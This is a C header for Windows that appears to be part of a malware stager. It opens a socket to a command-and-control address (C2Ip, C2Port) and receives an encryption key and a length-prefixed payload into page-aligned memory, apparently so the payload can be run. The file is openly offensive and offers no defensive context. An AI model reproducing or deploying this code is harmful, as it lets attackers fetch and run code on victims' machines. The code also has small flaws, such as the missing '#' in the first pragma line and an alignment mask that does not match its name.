pragma once
#include <WinSock2.h>
#include <Windows.h>
#include "serverinfo.h"
#include <winsock.h>
#include <stdio.h>
#include "config.h"


#ifndef PAYLOAD_EMBED



#define PAGE_SIZE 0x1000
#define PAGE_ALIGN(mem) (((mem) + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1))
#define MEM_ALIGN(mem) (((mem) + 0x10 - 1) & 0xffffffffffffff00)

BOOL PayloadReceive(SOCKET * pSocket, unsigned char **buffer, int *bufferlen, unsigned char **key, int *keylen)
{
    int byterecv = recv(*pSocket, (char *)keylen, sizeof(int), 0);
    if (byterecv == sizeof(int))
    {
        #ifdef DEBUG
        printf("[+] recv key length!\n");
        #endif
    }
    else 
    {
        #ifdef DEBUG
        printf("[+] Error in recv key length, abort!\n");
        #endif
        return FALSE;
    }
    unsigned char *tmp = (unsigned char *)malloc(MEM_ALIGN(*(keylen)));
    if (!tmp)
    {
        #ifdef DEBUG
        printf("[x] Failed allocate memory for key!\n");
        #endif
        return FALSE;
    }
    byterecv = recv(*pSocket, (char *)tmp, *keylen, 0);
    if (byterecv == *keylen)
    {
        *key = tmp;
        #ifdef DEBUG
        printf("[+] recv key!\n");
        #endif
    }
    else
    {
        #ifdef DEBUG
        printf("[x] Error in recv key, abort!\n");
        #endif
        return FALSE;
    }
    byterecv = recv(*pSocket,  (char *)bufferlen, sizeof(int), 0);
    if (byterecv == sizeof(int))
    {
        #ifdef DEBUG
        printf("[+] recv payload length!\n");
        #endif
    }
    else
    {
        #ifdef DEBUG
        printf("[x] Error in recv payload length, abort!\n");
        #endif
        return FALSE;
    }
    tmp = (unsigned char *)malloc(PAGE_ALIGN(*bufferlen));
    if (!tmp)
    {
        #ifdef DEBUG
        printf("[x] Failed allocate memory for paayload!\n");
        #endif
        return FALSE;
    }
    byterecv = recv(*pSocket, (char *)tmp, *bufferlen, 0);
    if (byterecv == *bufferlen)
    {
        *buffer = tmp;
        #ifdef DEBUG
        printf("[+] recv payload!\n");
        #endif
    }
    else
    {
        #ifdef DEBUG
        printf("[x] Error in recv payload, abort!\n");
        #endif
        return FALSE;
    }
    return TRUE;
}


void Listenner(SOCKET *pSocket)
{
    // WSASocket
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) 
    {
        #ifdef DEBUG
        printf("[x] WSAStartup failed.\n");
        #endif
        return ;
    }

    *pSocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, (LPWSAPROTOCOL_INFOA)NULL,0 , 0);
    SOCKADDR_IN serveraddr ;
    serveraddr.sin_family = AF_INET;
    serveraddr.sin_port = htons(C2Port);
    serveraddr.sin_addr.s_addr = inet_addr(C2Ip);
    if (WSAConnect(*pSocket, (struct sockaddr * )&serveraddr, sizeof(serveraddr), NULL, NULL, NULL,NULL) == SOCKET_ERROR)
    {
        #ifdef DEBUG
        printf("[x] failed connect socket!\n");
        #endif
        exit(0);
    }
}

#undef PAGE_SIZE
#undef PAGE_ALIGN
#undef MEM_ALIGN


#endif // !PAYLOAD_EMBED